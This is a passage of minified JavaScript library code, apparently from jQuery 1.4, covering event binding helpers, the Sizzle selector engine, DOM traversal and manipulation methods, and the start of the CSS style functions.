toggle:function(a){for(var b=arguments,d=1;d<b.length;)c.proxy(a,b[d++]);return this.click(c.proxy(a,function(f){var e=(c.data(this,"lastToggle"+a.guid)||0)%d;c.data(this,"lastToggle"+a.guid,e+1);f.preventDefault();return b[e].apply(this,arguments)||false}))},hover:function(a,b){return this.mouseenter(a).mouseleave(b||a)}});var Ga={focus:"focusin",blur:"focusout",mouseenter:"mouseover",mouseleave:"mouseout"};c.each(["live","die"],function(a,b){c.fn[b]=function(d,f,e,j){var i,o=0,k,n,r=j||this.selector,
u=j?this:c(this.context);if(c.isFunction(f)){e=f;f=w}for(d=(d||"").split(" ");(i=d[o++])!=null;){j=O.exec(i);k="";if(j){k=j[0];i=i.replace(O,"")}if(i==="hover")d.push("mouseenter"+k,"mouseleave"+k);else{n=i;if(i==="focus"||i==="blur"){d.push(Ga[i]+k);i+=k}else i=(Ga[i]||i)+k;b==="live"?u.each(function(){c.event.add(this,pa(i,r),{data:f,selector:r,handler:e,origType:i,origHandler:e,preType:n})}):u.unbind(pa(i,r),e)}}return this}});c.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error".split(" "),
function(a,b){c.fn[b]=function(d){return d?this.bind(b,d):this.trigger(b)};if(c.attrFn)c.attrFn[b]=true});A.attachEvent&&!A.addEventListener&&A.attachEvent("onunload",function(){for(var a in c.cache)if(c.cache[a].handle)try{c.event.remove(c.cache[a].handle.elem)}catch(b){}});(function(){function a(g){for(var h="",l,m=0;g[m];m++){l=g[m];if(l.nodeType===3||l.nodeType===4)h+=l.nodeValue;else if(l.nodeType!==8)h+=a(l.childNodes)}return h}function b(g,h,l,m,q,p){q=0;for(var v=m.length;q<v;q++){var t=m[q];
if(t){t=t[g];for(var y=false;t;){if(t.sizcache===l){y=m[t.sizset];break}if(t.nodeType===1&&!p){t.sizcache=l;t.sizset=q}if(t.nodeName.toLowerCase()===h){y=t;break}t=t[g]}m[q]=y}}}function d(g,h,l,m,q,p){q=0;for(var v=m.length;q<v;q++){var t=m[q];if(t){t=t[g];for(var y=false;t;){if(t.sizcache===l){y=m[t.sizset];break}if(t.nodeType===1){if(!p){t.sizcache=l;t.sizset=q}if(typeof h!=="string"){if(t===h){y=true;break}}else if(k.filter(h,[t]).length>0){y=t;break}}t=t[g]}m[q]=y}}}var f=/((?:\((?:\([^()]+\)|[^()]+)+\)|\[(?:\[[^[\]]*\]|['"][^'"]*['"]|[^[\]'"]+)+\]|\\.|[^ >+~,(\[\\]+)+|[>+~])(\s*,\s*)?((?:.|\r|\n)*)/g,
e=0,j=Object.prototype.toString,i=false,o=true;[0,0].sort(function(){o=false;return 0});var k=function(g,h,l,m){l=l||[];var q=h=h||s;if(h.nodeType!==1&&h.nodeType!==9)return[];if(!g||typeof g!=="string")return l;for(var p=[],v,t,y,S,H=true,M=x(h),I=g;(f.exec(""),v=f.exec(I))!==null;){I=v[3];p.push(v[1]);if(v[2]){S=v[3];break}}if(p.length>1&&r.exec(g))if(p.length===2&&n.relative[p[0]])t=ga(p[0]+p[1],h);else for(t=n.relative[p[0]]?[h]:k(p.shift(),h);p.length;){g=p.shift();if(n.relative[g])g+=p.shift();
t=ga(g,t)}else{if(!m&&p.length>1&&h.nodeType===9&&!M&&n.match.ID.test(p[0])&&!n.match.ID.test(p[p.length-1])){v=k.find(p.shift(),h,M);h=v.expr?k.filter(v.expr,v.set)[0]:v.set[0]}if(h){v=m?{expr:p.pop(),set:z(m)}:k.find(p.pop(),p.length===1&&(p[0]==="~"||p[0]==="+")&&h.parentNode?h.parentNode:h,M);t=v.expr?k.filter(v.expr,v.set):v.set;if(p.length>0)y=z(t);else H=false;for(;p.length;){var D=p.pop();v=D;if(n.relative[D])v=p.pop();else D="";if(v==null)v=h;n.relative[D](y,v,M)}}else y=[]}y||(y=t);y||k.error(D||
g);if(j.call(y)==="[object Array]")if(H)if(h&&h.nodeType===1)for(g=0;y[g]!=null;g++){if(y[g]&&(y[g]===true||y[g].nodeType===1&&E(h,y[g])))l.push(t[g])}else for(g=0;y[g]!=null;g++)y[g]&&y[g].nodeType===1&&l.push(t[g]);else l.push.apply(l,y);else z(y,l);if(S){k(S,q,l,m);k.uniqueSort(l)}return l};k.uniqueSort=function(g){if(B){i=o;g.sort(B);if(i)for(var h=1;h<g.length;h++)g[h]===g[h-1]&&g.splice(h--,1)}return g};k.matches=function(g,h){return k(g,null,null,h)};k.find=function(g,h,l){var m,q;if(!g)return[];
for(var p=0,v=n.order.length;p<v;p++){var t=n.order[p];if(q=n.leftMatch[t].exec(g)){var y=q[1];q.splice(1,1);if(y.substr(y.length-1)!=="\\"){q[1]=(q[1]||"").replace(/\\/g,"");m=n.find[t](q,h,l);if(m!=null){g=g.replace(n.match[t],"");break}}}}m||(m=h.getElementsByTagName("*"));return{set:m,expr:g}};k.filter=function(g,h,l,m){for(var q=g,p=[],v=h,t,y,S=h&&h[0]&&x(h[0]);g&&h.length;){for(var H in n.filter)if((t=n.leftMatch[H].exec(g))!=null&&t[2]){var M=n.filter[H],I,D;D=t[1];y=false;t.splice(1,1);if(D.substr(D.length-
1)!=="\\"){if(v===p)p=[];if(n.preFilter[H])if(t=n.preFilter[H](t,v,l,p,m,S)){if(t===true)continue}else y=I=true;if(t)for(var U=0;(D=v[U])!=null;U++)if(D){I=M(D,t,U,v);var Ha=m^!!I;if(l&&I!=null)if(Ha)y=true;else v[U]=false;else if(Ha){p.push(D);y=true}}if(I!==w){l||(v=p);g=g.replace(n.match[H],"");if(!y)return[];break}}}if(g===q)if(y==null)k.error(g);else break;q=g}return v};k.error=function(g){throw"Syntax error, unrecognized expression: "+g;};var n=k.selectors={order:["ID","NAME","TAG"],match:{ID:/#((?:[\w\u00c0-\uFFFF-]|\\.)+)/,
CLASS:/\.((?:[\w\u00c0-\uFFFF-]|\\.)+)/,NAME:/\[name=['"]*((?:[\w\u00c0-\uFFFF-]|\\.)+)['"]*\]/,ATTR:/\[\s*((?:[\w\u00c0-\uFFFF-]|\\.)+)\s*(?:(\S?=)\s*(['"]*)(.*?)\3|)\s*\]/,TAG:/^((?:[\w\u00c0-\uFFFF\*-]|\\.)+)/,CHILD:/:(only|nth|last|first)-child(?:\((even|odd|[\dn+-]*)\))?/,POS:/:(nth|eq|gt|lt|first|last|even|odd)(?:\((\d*)\))?(?=[^-]|$)/,PSEUDO:/:((?:[\w\u00c0-\uFFFF-]|\\.)+)(?:\((['"]?)((?:\([^\)]+\)|[^\(\)]*)+)\2\))?/},leftMatch:{},attrMap:{"class":"className","for":"htmlFor"},attrHandle:{href:function(g){return g.getAttribute("href")}},
relative:{"+":function(g,h){var l=typeof h==="string",m=l&&!/\W/.test(h);l=l&&!m;if(m)h=h.toLowerCase();m=0;for(var q=g.length,p;m<q;m++)if(p=g[m]){for(;(p=p.previousSibling)&&p.nodeType!==1;);g[m]=l||p&&p.nodeName.toLowerCase()===h?p||false:p===h}l&&k.filter(h,g,true)},">":function(g,h){var l=typeof h==="string";if(l&&!/\W/.test(h)){h=h.toLowerCase();for(var m=0,q=g.length;m<q;m++){var p=g[m];if(p){l=p.parentNode;g[m]=l.nodeName.toLowerCase()===h?l:false}}}else{m=0;for(q=g.length;m<q;m++)if(p=g[m])g[m]=
l?p.parentNode:p.parentNode===h;l&&k.filter(h,g,true)}},"":function(g,h,l){var m=e++,q=d;if(typeof h==="string"&&!/\W/.test(h)){var p=h=h.toLowerCase();q=b}q("parentNode",h,m,g,p,l)},"~":function(g,h,l){var m=e++,q=d;if(typeof h==="string"&&!/\W/.test(h)){var p=h=h.toLowerCase();q=b}q("previousSibling",h,m,g,p,l)}},find:{ID:function(g,h,l){if(typeof h.getElementById!=="undefined"&&!l)return(g=h.getElementById(g[1]))?[g]:[]},NAME:function(g,h){if(typeof h.getElementsByName!=="undefined"){var l=[];
h=h.getElementsByName(g[1]);for(var m=0,q=h.length;m<q;m++)h[m].getAttribute("name")===g[1]&&l.push(h[m]);return l.length===0?null:l}},TAG:function(g,h){return h.getElementsByTagName(g[1])}},preFilter:{CLASS:function(g,h,l,m,q,p){g=" "+g[1].replace(/\\/g,"")+" ";if(p)return g;p=0;for(var v;(v=h[p])!=null;p++)if(v)if(q^(v.className&&(" "+v.className+" ").replace(/[\t\n]/g," ").indexOf(g)>=0))l||m.push(v);else if(l)h[p]=false;return false},ID:function(g){return g[1].replace(/\\/g,"")},TAG:function(g){return g[1].toLowerCase()},
CHILD:function(g){if(g[1]==="nth"){var h=/(-?)(\d*)n((?:\+|-)?\d*)/.exec(g[2]==="even"&&"2n"||g[2]==="odd"&&"2n+1"||!/\D/.test(g[2])&&"0n+"+g[2]||g[2]);g[2]=h[1]+(h[2]||1)-0;g[3]=h[3]-0}g[0]=e++;return g},ATTR:function(g,h,l,m,q,p){h=g[1].replace(/\\/g,"");if(!p&&n.attrMap[h])g[1]=n.attrMap[h];if(g[2]==="~=")g[4]=" "+g[4]+" ";return g},PSEUDO:function(g,h,l,m,q){if(g[1]==="not")if((f.exec(g[3])||"").length>1||/^\w/.test(g[3]))g[3]=k(g[3],null,null,h);else{g=k.filter(g[3],h,l,true^q);l||m.push.apply(m,
g);return false}else if(n.match.POS.test(g[0])||n.match.CHILD.test(g[0]))return true;return g},POS:function(g){g.unshift(true);return g}},filters:{enabled:function(g){return g.disabled===false&&g.type!=="hidden"},disabled:function(g){return g.disabled===true},checked:function(g){return g.checked===true},selected:function(g){return g.selected===true},parent:function(g){return!!g.firstChild},empty:function(g){return!g.firstChild},has:function(g,h,l){return!!k(l[3],g).length},header:function(g){return/h\d/i.test(g.nodeName)},
text:function(g){return"text"===g.type},radio:function(g){return"radio"===g.type},checkbox:function(g){return"checkbox"===g.type},file:function(g){return"file"===g.type},password:function(g){return"password"===g.type},submit:function(g){return"submit"===g.type},image:function(g){return"image"===g.type},reset:function(g){return"reset"===g.type},button:function(g){return"button"===g.type||g.nodeName.toLowerCase()==="button"},input:function(g){return/input|select|textarea|button/i.test(g.nodeName)}},
setFilters:{first:function(g,h){return h===0},last:function(g,h,l,m){return h===m.length-1},even:function(g,h){return h%2===0},odd:function(g,h){return h%2===1},lt:function(g,h,l){return h<l[3]-0},gt:function(g,h,l){return h>l[3]-0},nth:function(g,h,l){return l[3]-0===h},eq:function(g,h,l){return l[3]-0===h}},filter:{PSEUDO:function(g,h,l,m){var q=h[1],p=n.filters[q];if(p)return p(g,l,h,m);else if(q==="contains")return(g.textContent||g.innerText||a([g])||"").indexOf(h[3])>=0;else if(q==="not"){h=
h[3];l=0;for(m=h.length;l<m;l++)if(h[l]===g)return false;return true}else k.error("Syntax error, unrecognized expression: "+q)},CHILD:function(g,h){var l=h[1],m=g;switch(l){case "only":case "first":for(;m=m.previousSibling;)if(m.nodeType===1)return false;if(l==="first")return true;m=g;case "last":for(;m=m.nextSibling;)if(m.nodeType===1)return false;return true;case "nth":l=h[2];var q=h[3];if(l===1&&q===0)return true;h=h[0];var p=g.parentNode;if(p&&(p.sizcache!==h||!g.nodeIndex)){var v=0;for(m=p.firstChild;m;m=
m.nextSibling)if(m.nodeType===1)m.nodeIndex=++v;p.sizcache=h}g=g.nodeIndex-q;return l===0?g===0:g%l===0&&g/l>=0}},ID:function(g,h){return g.nodeType===1&&g.getAttribute("id")===h},TAG:function(g,h){return h==="*"&&g.nodeType===1||g.nodeName.toLowerCase()===h},CLASS:function(g,h){return(" "+(g.className||g.getAttribute("class"))+" ").indexOf(h)>-1},ATTR:function(g,h){var l=h[1];g=n.attrHandle[l]?n.attrHandle[l](g):g[l]!=null?g[l]:g.getAttribute(l);l=g+"";var m=h[2];h=h[4];return g==null?m==="!=":m===
"="?l===h:m==="*="?l.indexOf(h)>=0:m==="~="?(" "+l+" ").indexOf(h)>=0:!h?l&&g!==false:m==="!="?l!==h:m==="^="?l.indexOf(h)===0:m==="$="?l.substr(l.length-h.length)===h:m==="|="?l===h||l.substr(0,h.length+1)===h+"-":false},POS:function(g,h,l,m){var q=n.setFilters[h[2]];if(q)return q(g,l,h,m)}}},r=n.match.POS;for(var u in n.match){n.match[u]=new RegExp(n.match[u].source+/(?![^\[]*\])(?![^\(]*\))/.source);n.leftMatch[u]=new RegExp(/(^(?:.|\r|\n)*?)/.source+n.match[u].source.replace(/\\(\d+)/g,function(g,
h){return"\\"+(h-0+1)}))}var z=function(g,h){g=Array.prototype.slice.call(g,0);if(h){h.push.apply(h,g);return h}return g};try{Array.prototype.slice.call(s.documentElement.childNodes,0)}catch(C){z=function(g,h){h=h||[];if(j.call(g)==="[object Array]")Array.prototype.push.apply(h,g);else if(typeof g.length==="number")for(var l=0,m=g.length;l<m;l++)h.push(g[l]);else for(l=0;g[l];l++)h.push(g[l]);return h}}var B;if(s.documentElement.compareDocumentPosition)B=function(g,h){if(!g.compareDocumentPosition||
!h.compareDocumentPosition){if(g==h)i=true;return g.compareDocumentPosition?-1:1}g=g.compareDocumentPosition(h)&4?-1:g===h?0:1;if(g===0)i=true;return g};else if("sourceIndex"in s.documentElement)B=function(g,h){if(!g.sourceIndex||!h.sourceIndex){if(g==h)i=true;return g.sourceIndex?-1:1}g=g.sourceIndex-h.sourceIndex;if(g===0)i=true;return g};else if(s.createRange)B=function(g,h){if(!g.ownerDocument||!h.ownerDocument){if(g==h)i=true;return g.ownerDocument?-1:1}var l=g.ownerDocument.createRange(),m=
h.ownerDocument.createRange();l.setStart(g,0);l.setEnd(g,0);m.setStart(h,0);m.setEnd(h,0);g=l.compareBoundaryPoints(Range.START_TO_END,m);if(g===0)i=true;return g};(function(){var g=s.createElement("div"),h="script"+(new Date).getTime();g.innerHTML="<a name='"+h+"'/>";var l=s.documentElement;l.insertBefore(g,l.firstChild);if(s.getElementById(h)){n.find.ID=function(m,q,p){if(typeof q.getElementById!=="undefined"&&!p)return(q=q.getElementById(m[1]))?q.id===m[1]||typeof q.getAttributeNode!=="undefined"&&
q.getAttributeNode("id").nodeValue===m[1]?[q]:w:[]};n.filter.ID=function(m,q){var p=typeof m.getAttributeNode!=="undefined"&&m.getAttributeNode("id");return m.nodeType===1&&p&&p.nodeValue===q}}l.removeChild(g);l=g=null})();(function(){var g=s.createElement("div");g.appendChild(s.createComment(""));if(g.getElementsByTagName("*").length>0)n.find.TAG=function(h,l){l=l.getElementsByTagName(h[1]);if(h[1]==="*"){h=[];for(var m=0;l[m];m++)l[m].nodeType===1&&h.push(l[m]);l=h}return l};g.innerHTML="<a href='#'></a>";
if(g.firstChild&&typeof g.firstChild.getAttribute!=="undefined"&&g.firstChild.getAttribute("href")!=="#")n.attrHandle.href=function(h){return h.getAttribute("href",2)};g=null})();s.querySelectorAll&&function(){var g=k,h=s.createElement("div");h.innerHTML="<p class='TEST'></p>";if(!(h.querySelectorAll&&h.querySelectorAll(".TEST").length===0)){k=function(m,q,p,v){q=q||s;if(!v&&q.nodeType===9&&!x(q))try{return z(q.querySelectorAll(m),p)}catch(t){}return g(m,q,p,v)};for(var l in g)k[l]=g[l];h=null}}();
(function(){var g=s.createElement("div");g.innerHTML="<div class='test e'></div><div class='test'></div>";if(!(!g.getElementsByClassName||g.getElementsByClassName("e").length===0)){g.lastChild.className="e";if(g.getElementsByClassName("e").length!==1){n.order.splice(1,0,"CLASS");n.find.CLASS=function(h,l,m){if(typeof l.getElementsByClassName!=="undefined"&&!m)return l.getElementsByClassName(h[1])};g=null}}})();var E=s.compareDocumentPosition?function(g,h){return!!(g.compareDocumentPosition(h)&16)}:
function(g,h){return g!==h&&(g.contains?g.contains(h):true)},x=function(g){return(g=(g?g.ownerDocument||g:0).documentElement)?g.nodeName!=="HTML":false},ga=function(g,h){var l=[],m="",q;for(h=h.nodeType?[h]:h;q=n.match.PSEUDO.exec(g);){m+=q[0];g=g.replace(n.match.PSEUDO,"")}g=n.relative[g]?g+"*":g;q=0;for(var p=h.length;q<p;q++)k(g,h[q],l);return k.filter(m,l)};c.find=k;c.expr=k.selectors;c.expr[":"]=c.expr.filters;c.unique=k.uniqueSort;c.text=a;c.isXMLDoc=x;c.contains=E})();var eb=/Until$/,fb=/^(?:parents|prevUntil|prevAll)/,
gb=/,/;R=Array.prototype.slice;var Ia=function(a,b,d){if(c.isFunction(b))return c.grep(a,function(e,j){return!!b.call(e,j,e)===d});else if(b.nodeType)return c.grep(a,function(e){return e===b===d});else if(typeof b==="string"){var f=c.grep(a,function(e){return e.nodeType===1});if(Ua.test(b))return c.filter(b,f,!d);else b=c.filter(b,f)}return c.grep(a,function(e){return c.inArray(e,b)>=0===d})};c.fn.extend({find:function(a){for(var b=this.pushStack("","find",a),d=0,f=0,e=this.length;f<e;f++){d=b.length;
c.find(a,this[f],b);if(f>0)for(var j=d;j<b.length;j++)for(var i=0;i<d;i++)if(b[i]===b[j]){b.splice(j--,1);break}}return b},has:function(a){var b=c(a);return this.filter(function(){for(var d=0,f=b.length;d<f;d++)if(c.contains(this,b[d]))return true})},not:function(a){return this.pushStack(Ia(this,a,false),"not",a)},filter:function(a){return this.pushStack(Ia(this,a,true),"filter",a)},is:function(a){return!!a&&c.filter(a,this).length>0},closest:function(a,b){if(c.isArray(a)){var d=[],f=this[0],e,j=
{},i;if(f&&a.length){e=0;for(var o=a.length;e<o;e++){i=a[e];j[i]||(j[i]=c.expr.match.POS.test(i)?c(i,b||this.context):i)}for(;f&&f.ownerDocument&&f!==b;){for(i in j){e=j[i];if(e.jquery?e.index(f)>-1:c(f).is(e)){d.push({selector:i,elem:f});delete j[i]}}f=f.parentNode}}return d}var k=c.expr.match.POS.test(a)?c(a,b||this.context):null;return this.map(function(n,r){for(;r&&r.ownerDocument&&r!==b;){if(k?k.index(r)>-1:c(r).is(a))return r;r=r.parentNode}return null})},index:function(a){if(!a||typeof a===
"string")return c.inArray(this[0],a?c(a):this.parent().children());return c.inArray(a.jquery?a[0]:a,this)},add:function(a,b){a=typeof a==="string"?c(a,b||this.context):c.makeArray(a);b=c.merge(this.get(),a);return this.pushStack(qa(a[0])||qa(b[0])?b:c.unique(b))},andSelf:function(){return this.add(this.prevObject)}});c.each({parent:function(a){return(a=a.parentNode)&&a.nodeType!==11?a:null},parents:function(a){return c.dir(a,"parentNode")},parentsUntil:function(a,b,d){return c.dir(a,"parentNode",
d)},next:function(a){return c.nth(a,2,"nextSibling")},prev:function(a){return c.nth(a,2,"previousSibling")},nextAll:function(a){return c.dir(a,"nextSibling")},prevAll:function(a){return c.dir(a,"previousSibling")},nextUntil:function(a,b,d){return c.dir(a,"nextSibling",d)},prevUntil:function(a,b,d){return c.dir(a,"previousSibling",d)},siblings:function(a){return c.sibling(a.parentNode.firstChild,a)},children:function(a){return c.sibling(a.firstChild)},contents:function(a){return c.nodeName(a,"iframe")?
a.contentDocument||a.contentWindow.document:c.makeArray(a.childNodes)}},function(a,b){c.fn[a]=function(d,f){var e=c.map(this,b,d);eb.test(a)||(f=d);if(f&&typeof f==="string")e=c.filter(f,e);e=this.length>1?c.unique(e):e;if((this.length>1||gb.test(f))&&fb.test(a))e=e.reverse();return this.pushStack(e,a,R.call(arguments).join(","))}});c.extend({filter:function(a,b,d){if(d)a=":not("+a+")";return c.find.matches(a,b)},dir:function(a,b,d){var f=[];for(a=a[b];a&&a.nodeType!==9&&(d===w||a.nodeType!==1||!c(a).is(d));){a.nodeType===
1&&f.push(a);a=a[b]}return f},nth:function(a,b,d){b=b||1;for(var f=0;a;a=a[d])if(a.nodeType===1&&++f===b)break;return a},sibling:function(a,b){for(var d=[];a;a=a.nextSibling)a.nodeType===1&&a!==b&&d.push(a);return d}});var Ja=/ jQuery\d+="(?:\d+|null)"/g,V=/^\s+/,Ka=/(<([\w:]+)[^>]*?)\/>/g,hb=/^(?:area|br|col|embed|hr|img|input|link|meta|param)$/i,La=/<([\w:]+)/,ib=/<tbody/i,jb=/<|&#?\w+;/,ta=/<script|<object|<embed|<option|<style/i,ua=/checked\s*(?:[^=]|=\s*.checked.)/i,Ma=function(a,b,d){return hb.test(d)?
a:b+"></"+d+">"},F={option:[1,"<select multiple='multiple'>","</select>"],legend:[1,"<fieldset>","</fieldset>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],area:[1,"<map>","</map>"],_default:[0,"",""]};F.optgroup=F.option;F.tbody=F.tfoot=F.colgroup=F.caption=F.thead;F.th=F.td;if(!c.support.htmlSerialize)F._default=[1,"div<div>","</div>"];c.fn.extend({text:function(a){if(c.isFunction(a))return this.each(function(b){var d=
c(this);d.text(a.call(this,b,d.text()))});if(typeof a!=="object"&&a!==w)return this.empty().append((this[0]&&this[0].ownerDocument||s).createTextNode(a));return c.text(this)},wrapAll:function(a){if(c.isFunction(a))return this.each(function(d){c(this).wrapAll(a.call(this,d))});if(this[0]){var b=c(a,this[0].ownerDocument).eq(0).clone(true);this[0].parentNode&&b.insertBefore(this[0]);b.map(function(){for(var d=this;d.firstChild&&d.firstChild.nodeType===1;)d=d.firstChild;return d}).append(this)}return this},
wrapInner:function(a){if(c.isFunction(a))return this.each(function(b){c(this).wrapInner(a.call(this,b))});return this.each(function(){var b=c(this),d=b.contents();d.length?d.wrapAll(a):b.append(a)})},wrap:function(a){return this.each(function(){c(this).wrapAll(a)})},unwrap:function(){return this.parent().each(function(){c.nodeName(this,"body")||c(this).replaceWith(this.childNodes)}).end()},append:function(){return this.domManip(arguments,true,function(a){this.nodeType===1&&this.appendChild(a)})},
prepend:function(){return this.domManip(arguments,true,function(a){this.nodeType===1&&this.insertBefore(a,this.firstChild)})},before:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,false,function(b){this.parentNode.insertBefore(b,this)});else if(arguments.length){var a=c(arguments[0]);a.push.apply(a,this.toArray());return this.pushStack(a,"before",arguments)}},after:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,false,function(b){this.parentNode.insertBefore(b,
this.nextSibling)});else if(arguments.length){var a=this.pushStack(this,"after",arguments);a.push.apply(a,c(arguments[0]).toArray());return a}},remove:function(a,b){for(var d=0,f;(f=this[d])!=null;d++)if(!a||c.filter(a,[f]).length){if(!b&&f.nodeType===1){c.cleanData(f.getElementsByTagName("*"));c.cleanData([f])}f.parentNode&&f.parentNode.removeChild(f)}return this},empty:function(){for(var a=0,b;(b=this[a])!=null;a++)for(b.nodeType===1&&c.cleanData(b.getElementsByTagName("*"));b.firstChild;)b.removeChild(b.firstChild);
return this},clone:function(a){var b=this.map(function(){if(!c.support.noCloneEvent&&!c.isXMLDoc(this)){var d=this.outerHTML,f=this.ownerDocument;if(!d){d=f.createElement("div");d.appendChild(this.cloneNode(true));d=d.innerHTML}return c.clean([d.replace(Ja,"").replace(/=([^="'>\s]+\/)>/g,'="$1">').replace(V,"")],f)[0]}else return this.cloneNode(true)});if(a===true){ra(this,b);ra(this.find("*"),b.find("*"))}return b},html:function(a){if(a===w)return this[0]&&this[0].nodeType===1?this[0].innerHTML.replace(Ja,
""):null;else if(typeof a==="string"&&!ta.test(a)&&(c.support.leadingWhitespace||!V.test(a))&&!F[(La.exec(a)||["",""])[1].toLowerCase()]){a=a.replace(Ka,Ma);try{for(var b=0,d=this.length;b<d;b++)if(this[b].nodeType===1){c.cleanData(this[b].getElementsByTagName("*"));this[b].innerHTML=a}}catch(f){this.empty().append(a)}}else c.isFunction(a)?this.each(function(e){var j=c(this),i=j.html();j.empty().append(function(){return a.call(this,e,i)})}):this.empty().append(a);return this},replaceWith:function(a){if(this[0]&&
this[0].parentNode){if(c.isFunction(a))return this.each(function(b){var d=c(this),f=d.html();d.replaceWith(a.call(this,b,f))});if(typeof a!=="string")a=c(a).detach();return this.each(function(){var b=this.nextSibling,d=this.parentNode;c(this).remove();b?c(b).before(a):c(d).append(a)})}else return this.pushStack(c(c.isFunction(a)?a():a),"replaceWith",a)},detach:function(a){return this.remove(a,true)},domManip:function(a,b,d){function f(u){return c.nodeName(u,"table")?u.getElementsByTagName("tbody")[0]||
u.appendChild(u.ownerDocument.createElement("tbody")):u}var e,j,i=a[0],o=[],k;if(!c.support.checkClone&&arguments.length===3&&typeof i==="string"&&ua.test(i))return this.each(function(){c(this).domManip(a,b,d,true)});if(c.isFunction(i))return this.each(function(u){var z=c(this);a[0]=i.call(this,u,b?z.html():w);z.domManip(a,b,d)});if(this[0]){e=i&&i.parentNode;e=c.support.parentNode&&e&&e.nodeType===11&&e.childNodes.length===this.length?{fragment:e}:sa(a,this,o);k=e.fragment;if(j=k.childNodes.length===
1?(k=k.firstChild):k.firstChild){b=b&&c.nodeName(j,"tr");for(var n=0,r=this.length;n<r;n++)d.call(b?f(this[n],j):this[n],n>0||e.cacheable||this.length>1?k.cloneNode(true):k)}o.length&&c.each(o,Qa)}return this}});c.fragments={};c.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(a,b){c.fn[a]=function(d){var f=[];d=c(d);var e=this.length===1&&this[0].parentNode;if(e&&e.nodeType===11&&e.childNodes.length===1&&d.length===1){d[b](this[0]);
return this}else{e=0;for(var j=d.length;e<j;e++){var i=(e>0?this.clone(true):this).get();c.fn[b].apply(c(d[e]),i);f=f.concat(i)}return this.pushStack(f,a,d.selector)}}});c.extend({clean:function(a,b,d,f){b=b||s;if(typeof b.createElement==="undefined")b=b.ownerDocument||b[0]&&b[0].ownerDocument||s;for(var e=[],j=0,i;(i=a[j])!=null;j++){if(typeof i==="number")i+="";if(i){if(typeof i==="string"&&!jb.test(i))i=b.createTextNode(i);else if(typeof i==="string"){i=i.replace(Ka,Ma);var o=(La.exec(i)||["",
""])[1].toLowerCase(),k=F[o]||F._default,n=k[0],r=b.createElement("div");for(r.innerHTML=k[1]+i+k[2];n--;)r=r.lastChild;if(!c.support.tbody){n=ib.test(i);o=o==="table"&&!n?r.firstChild&&r.firstChild.childNodes:k[1]==="<table>"&&!n?r.childNodes:[];for(k=o.length-1;k>=0;--k)c.nodeName(o[k],"tbody")&&!o[k].childNodes.length&&o[k].parentNode.removeChild(o[k])}!c.support.leadingWhitespace&&V.test(i)&&r.insertBefore(b.createTextNode(V.exec(i)[0]),r.firstChild);i=r.childNodes}if(i.nodeType)e.push(i);else e=
c.merge(e,i)}}if(d)for(j=0;e[j];j++)if(f&&c.nodeName(e[j],"script")&&(!e[j].type||e[j].type.toLowerCase()==="text/javascript"))f.push(e[j].parentNode?e[j].parentNode.removeChild(e[j]):e[j]);else{e[j].nodeType===1&&e.splice.apply(e,[j+1,0].concat(c.makeArray(e[j].getElementsByTagName("script"))));d.appendChild(e[j])}return e},cleanData:function(a){for(var b,d,f=c.cache,e=c.event.special,j=c.support.deleteExpando,i=0,o;(o=a[i])!=null;i++)if(d=o[c.expando]){b=f[d];if(b.events)for(var k in b.events)e[k]?
c.event.remove(o,k):Ca(o,k,b.handle);if(j)delete o[c.expando];else o.removeAttribute&&o.removeAttribute(c.expando);delete f[d]}}});var kb=/z-?index|font-?weight|opacity|zoom|line-?height/i,Na=/alpha\([^)]*\)/,Oa=/opacity=([^)]*)/,ha=/float/i,ia=/-([a-z])/ig,lb=/([A-Z])/g,mb=/^-?\d+(?:px)?$/i,nb=/^-?\d/,ob={position:"absolute",visibility:"hidden",display:"block"},pb=["Left","Right"],qb=["Top","Bottom"],rb=s.defaultView&&s.defaultView.getComputedStyle,Pa=c.support.cssFloat?"cssFloat":"styleFloat",ja=
function(a,b){return b.toUpperCase()};c.fn.css=function(a,b){return X(this,a,b,true,function(d,f,e){if(e===w)return c.curCSS(d,f);if(typeof e==="number"&&!kb.test(f))e+="px";c.style(d,f,e)})};c.extend({style:function(a,b,d){if(!a||a.nodeType===3||a.nodeType===8)return w;if((b==="width"||b==="height")&&parseFloat(d)<0)d=w;var f=a.style||a,e=d!==w;if(!c.support.opacity&&b==="opacity"){if(e){f.zoom=1;b=parseInt(d,10)+""==="NaN"?"":"alpha(opacity="+d*100+")";a=f.filter||c.curCSS(a,"filter")||"";f.filter=
Na.test(a)?a.replace(Na,b):b}return f.filter&&f.filter.indexOf("opacity=")>=0?parseFloat(Oa.exec(f.filter)[1])/100+"":""}if(ha.test(b))b=Pa;b=b.replace(ia,ja);if(e)f[b]=d;return f[b]},css:function(a,b,d,f){if(b==="width"||b==="height"){var e,j=b==="width"?pb:qb;function i(){e=b==="width"?a.offsetWidth:a.offsetHeight;f!=="border"&&c.each(j,function(){f||(e-=parseFloat(c.curCSS(a,"padding"+this,true))||0);if(f==="margin")e+=parseFloat(c.curCSS(a,"margin"+this,true))||0;else e-=parseFloat(c.curCSS(a,
"border"+this+"Width",true))||0})}a.offsetWidth!==0?i():c.swap(a,ob,i);return Math.max(0,Math.round(e))}return c.curCSS(a,b,d)},curCSS:function(a,b,d){var f,e=a.style;if(!c.support.opacity&&b==="opacity"&&a.currentStyle){f=Oa.test(a.currentStyle.filter||"")?parseFloat(RegExp.$1)/100+"":"";return f===""?"1":f}if(ha.test(b))b=Pa;if(!d&&e&&e[b])f=e[b];else if(rb){if(ha.test(b))b="float";b=b.replace(lb,"-$1").toLowerCase();e=a.ownerDocument.defaultView;if(!e)return null;if(a=e.getComputedStyle(a,null))f=
